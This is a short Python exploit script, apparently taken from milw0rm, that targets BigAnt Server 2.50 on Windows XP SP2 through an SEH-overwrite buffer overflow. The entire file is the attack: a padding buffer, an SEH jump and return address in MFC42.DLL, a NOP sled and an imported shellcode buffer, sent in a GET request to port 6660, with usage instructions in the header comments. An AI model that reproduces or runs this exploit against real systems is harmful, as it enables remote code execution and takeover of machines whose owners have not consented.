#!/usr/bin/python
# by hack4love
# BigAnt Server version 2.50 SEH Overwrite Universal
# discovered by Blake http://www.milw0rm.com/exploits/9673
# Tested on Windows XP SP2
# gratez to Blake
# use >> bigant.py 192.168.1.12 6660





import socket
import struct
from struct import pack
from payload import buf
import sys
def shell_attack(target_machine, target_port):
    host = target_machine
    port = target_port # port 6660 by default
    payload = b"\x41" * 985
    next_seh = b"\xeb\x06\x90\x90"
    seh = b"\xc3\x20\xc4\x6b" #MFC42.DLL
    nops = b"\x90" * 10
    sec = buf

     
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
     s.connect((host,port))
    except:
     sys.exit()

 
    s.send(b"GET " + payload + next_seh + seh + nops + sec + b"\r\n\r\n")
    s.close()

    # milw0rm.com [2009-09-15]